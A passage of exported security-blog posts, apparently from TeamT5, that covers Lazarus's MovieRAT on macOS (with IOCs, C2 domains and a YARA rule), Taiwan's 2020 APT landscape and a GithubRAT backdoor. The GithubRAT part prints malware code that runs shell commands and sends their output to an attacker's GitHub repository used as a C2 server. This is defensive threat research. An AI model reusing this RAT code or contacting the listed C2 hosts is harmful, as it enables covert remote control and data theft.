是駭客特意架設的虛擬貨幣交易網站，並透過該網站的應用程式下載安裝連結來散佈惡意程式。根據網站的支援語系，推測駭客攻擊標的為英、法、德及中文的虛擬貨幣用戶，如圖三所示。\n\n<br>\n\n![2020-12-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-3_c882e11ea8.png)\n_圖三、esilet.com 支援英、法、德及中文語系_\n\n<br>\n\nEsilet.dmg 執行後，會和中繼站連線獲取 config，config 的連線特徵為 \"C2 + /update/ + {platform}.json\"，故 macOS 版本的 config 下載連結為 \"ht<span>tps://</span>esilet[.]com/update/darwin.json\"。所下載的惡意程式經過 UPX 加殼，會存放於系統的暫存目錄後執行。經過分析，該惡意程式的通訊協議和 MoiveRAT 相同，故確定此惡意樣本是由 MovieRAT 改寫的變種程式。\n\n<br>\n\n![2020-12-4](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-4_e77cf3db22.png)\n_圖四、Esilet.dmg 下載 MovieRAT 的逆向分析截圖_\n\n<br>\n\n當 MovieRAT 成功執行後，其嘗試加入 Launch Daemons/Services，將 property lists 檔案 com.applex.services.agent.agent.plist 放置於 {HomeDirectory}/Library/LaunchAgents 目錄，若寫入失敗則會寫入至 /Library/LaunchDaemons 之中，藉此達到開機後惡意程式自動執行的持續控制手法，如圖五所示。\n\n<br>\n\n![2020-12-5](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-5_82214f3ea6.png)\n_圖五、將 plist 寫入開機執行設定之中_\n\n<br>\n\n其所連線的中繼站位址為固定並寫死（Hard Coding）於程式中，分別為 infodigitalnew.com、www.vinoymas.ch 及 sche-eg.org，如圖六所示。\n\n<br>\n\n![2020-12-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-6_a9d7f08bae.png)\n_圖六、惡意中繼站位址寫死於程式碼中_\n\n<br>\n\n樣本連線至中繼站後，駭客將會傳遞不同的指令碼（Command Code），樣本取得指令後會執行對應的動作，如上傳/下載檔案、指令執行及檔案/資訊回傳等，詳細資訊如圖七及表一所示。\n\n<br>\n\n![2020-12-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909880/2020-12-7_12bab7ef9f.png)\n_圖七、指令碼逆向分析結果_\n\n<br>\n<br>\n\n| 指令碼 | 描述 |\n| -- | -- |\n| 0x21279E | 從中繼站下載檔案並存放於特定路徑 | \n| 0x2AFCB2 | 取得主機資訊 |\n| 0x38CE55 | Heartbeat |\n| 0x3A65F8 | 字串(string)轉換為數字(integer) |\n| 0x3A6A93 | 傳送HTTP封包至中繼站 |\n| 0x3B187D | 空指令 |\n| 0x484B81 | 上傳檔案至中繼站 |\n| 0x48C82A | 透過HTTP從中繼站下載檔案|\n| 0x48D6FC | 執行指令(新加入的指令碼)|\n| 0x7FC0A4 | 執行指令並回傳結果 |\n\n_表一、指令碼清單_\n\n<br>\n\nTeamT5 經由該樣本關聯至 MovieRAT 後門程式，MovieRAT 是個輕量化的後門控制程式，支援最基本的檔案上傳/下載、指令執行及程序操作等功能。通常被駭客用於成功入侵後的第二階段控制（2nd-stage RAT）之用。先前所掌握的 MovieRAT 後門為 Windows 惡意程式，會透過 HTTP 通訊協定與中繼站連線，所使用的 Cookie 具有特定格式。\n\n根據 TeamT5 的情資，將 MovieRAT 定位到駭客組織 Lazarus 身上。Lazarus 為北韓的駭客族群，擁有多起攻擊金融產業的紀錄，尤其特別針對 SWIFT 跨國轉帳交易系統和 ATM 自動櫃員機系統進行攻擊。推測為了替北韓政權籌措資金，好發展武器與實驗，故多選擇金融產業和具有關鍵技術的私人企業進行攻擊。過往的攻擊行動中，會在惡意程式內參雜俄文，企圖混淆分析人員。近期則是開始大量入侵攻擊虛擬貨幣交易所，如 Bithumb、Youbit 及 Yapizon 等，造成上百萬美元的金額損失。\n\n## IOCs（惡意攻擊指標）\n\n|IOC|類型|\n|-|-|\n|53d9af8829a9c7f6f177178885901c01|MD5|\n|ae9f4e39c576555faadee136c6c3b2d358ad90b9|SHA1|\n|9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598|SHA256|\n|9578c2be6437dcc8517e78a5de1fa975|MD5|\n|d2a77c31c3e169bec655068e96cf4e7fc52e77b8|SHA1|\n|dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156|SHA256|\n|esilet.com|Domain|\n|www.kurunzi.news|Domain|\n|oasismagazine.africa|Domain|\n|lerenmetsara.net|Domain|\n|ht<span>tps://</span>infodigitalnew.com/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>www.vinoymas.ch/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>sche-eg.org/plugins/top.php |URL|\n\n## 影響與建議\n\n 1. 透過 TeamT5 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 檢查是否有攻擊者活動跡象，ThreatSonar 支援 Windows、Linux 及 macOS 作業系統。\n 2. 使用以下 yara rule 掃描主機系統，檢查是否存在 MovieRAT 後門程式。\n\n ```\n rule TeamT5_Lazarus_MovieRAT\n {\n     meta:\n         author        = \"TeamT5\"\n         description   = \"Lazarus - MovieRAT\"\n     strings:\n         $cookie = \"Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s\" fullword\n         $str_1 = \"GA1.%d.\" fullword\n         $str_2 = \".%d%05d%04d\" fullword\n     condition:\n         all of them\n }\n ```\n \n ![2020-12-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909882/2020-12-8_34a68e7370.png)\n\n 3. 可將前述的 IOC 清單匯入既有的資安設備中，進行偵測阻擋防禦之用。\n 4. 更多 APT 駭客族群資訊，可參考 TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 情資平台。\n\n<br>\n","title":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","createdAt":"2020-12-10T07:32:08.061Z","updatedAt":"2020-12-15T06:48:21.344Z","__v":0,"id":"5fd1cef89f8bdc004a7fdf4b"}],"createdAt":"2020-12-10T07:32:07.952Z","updatedAt":"2021-01-27T04:40:39.817Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1607585599/the-company-3338207_1920_61abdf84cd.jpg","id":"5fd1cef79f8bdc004a7fdf4a"},{"publish":true,"enable_form":false,"tags":["5ece28882e1ee4004aa406f2","5ecf890dfedd7f004b26978e","5eec1435163518003f86d92e","609b55892107530037594b0c"],"relative_posts":["5f3fdeb5163518003f86dad5","6059a16cc56e80003f985a6f","609b4c052107530037594b01","6098e8e32107530037594ad3"],"_id":"609899422107530037594a80","post_url":"apt-threat-landscape-of-taiwan-in-2020","post_name":"2020 年台灣 APT 網路攻擊態勢","publish_date":"2021-05-10T03:30:00.000Z","contents":[{"locale":"tw","_id":"609899422107530037594a81","context":"**By TeamT5 杜浦數位安全 技術長 李庭閣 Charles Li**\n\n2020 年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n<br>\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n<br>\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n<br>\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n<br>\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n<br>\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 是一個以網路威脅情資為核心概念的防護方案，同時我們有一群專業的專家分析師持續做研究來讓我們持續領先於攻擊者的腳步。\n\n> 如果您希望進一步了解我們的資安產品、解決方案或是想跟我們討論您所面臨的網路威脅，我們誠摯歡迎您與我們聯絡：<sales@teamt5.org>\n\n<br>\n\n### 參考資料\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO","title":"2020 年台灣 APT 網路攻擊態勢","__v":0,"id":"609899422107530037594a81"},{"locale":"en","_id":"609899422107530037594a82","title":"APT Threat Landscape of Taiwan in 2020","__v":0,"context":"**By TeamT5 CTO Charles Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n<br>\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n<br>\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n<br>\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n<br>\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n<br>\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend. TeamT5 has a cyber threat intelligence (CTI) centered solution, [ThreatVision](https://teamt5.org/en/products/threatvision/), and we rely on a dedicated team of security experts to keep us steps ahead of threat actors. Feel free to contact TeamT5 in case you want to know more about our products, solutions or discuss about threats you are facing.\n\n> Contact us: <sales@teamt5.org>\n\n<br>\n\n### Reference\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO\n\n","id":"609899422107530037594a82"}],"createdAt":"2021-05-10T02:24:02.304Z","updatedAt":"2021-06-10T04:40:39.875Z","__v":1,"topic":"5ecaa012a792d70040a0d8b1","author":"5ece27142e1ee4004aa406ef","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620615558/1_99cbb30acf.png","id":"609899422107530037594a80"},{"publish":true,"enable_form":false,"tags":["6063e4e43e88da003f2f660c","5f979c9e1d1f9c004b931d5c","5ecf890dfedd7f004b26978e"],"relative_posts":["6059a16cc56e80003f985a6f","60a365f93f9d29004041a487","609b4c052107530037594b01","60c196993f9d29004041a4e1"],"_id":"60b5e6a53f9d29004041a4cd","post_name":"【臺灣資安大會直擊】增進外界對 APT 攻擊族群認識，TeamT5 出奇招，將抽象的駭客組織化身展覽作品","post_url":"ithome-cybersec2021-teamt5-moma","publish_date":"2021-05-31T10:00:00.000Z","contents":[{"locale":"tw","_id":"60b5e6a53f9d29004041a4ce","context":"為了增進大眾對於 APT 攻擊族群的認識，長期進行駭客追蹤研究的 TeamT5 杜浦數位安全，藉由藝術博物館（MOMA）作品介紹的形式，讓參觀者能夠感到興趣，並簡單認識這些 APT 族群的特性。\n\n在資安新聞或報告中，可能常常看到某些攻擊事件是由特定駭客組織所為，然而，對於這些駭客組織本身的了解，可能多半不夠深刻，是否有更平易近人的方式，增進大眾對一些駭客組織的認識呢？\n\n事實上，網路攻擊日益複雜，這些有組織的駭客團體，花了很多心力瞭解可能是攻擊目標的你我，但是，相對地，整個公眾對這些駭客組織有概括性的了解嗎？長期進行駭客追蹤研究的 TeamT5 杜浦數位安全，在本月舉行的 2021 臺灣資安大會展區上，特別用上類似藝術展覽的形式，讓參觀的人能從不一樣的視角，認識幾個不可不知的APT攻擊團體，掌握其特性。\n\n在這樣的展區中，TeamT5 打造出有如現代藝術博物館（MOMA）的布置場景，擺放著4件作品，將原本抽象的攻擊族群，具現為某種裝置藝術品來展示，同時，一旁的牆面上，也有著對於 APT 族群一詞的中英文介紹，說明每個 APT 族群都有自己的地域性與慣用的攻擊手法，以及經常鎖定的國家與產業。\n\n在現場擺設的這些創作中，連結的 APT 攻擊族群共有 4 個，包括：Lazarus、HUAPI、AMOEBA 與 Nian。目的就是希望將這些壞人（駭客組織）的特徵實體化，讓企業用戶能夠知道，他們到底是面對什麼樣的敵人，這些壞人有什麼樣的特徵或能力。\n\n[點此閱讀完整報導](https://www.ithome.com.tw/news/144717?fbclid=IwAR3EmZoOA_HlreIov_84clZasdSfEH7HqPTZldHK39raXBd6pwgkmYsnw4U)\n\n<br>\n","title":"【臺灣資安大會直擊】TeamT5 出奇招，將抽象的 APT 駭客組織化身展覽作品","__v":0,"id":"60b5e6a53f9d29004041a4ce"}],"createdAt":"2021-06-01T07:49:57.126Z","updatedAt":"2021-06-10T04:44:49.177Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1622534385/Mo_Ma_640d2adf75.jpg","id":"60b5e6a53f9d29004041a4cd"}],"id":"5ecf890dfedd7f004b26978e"}],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 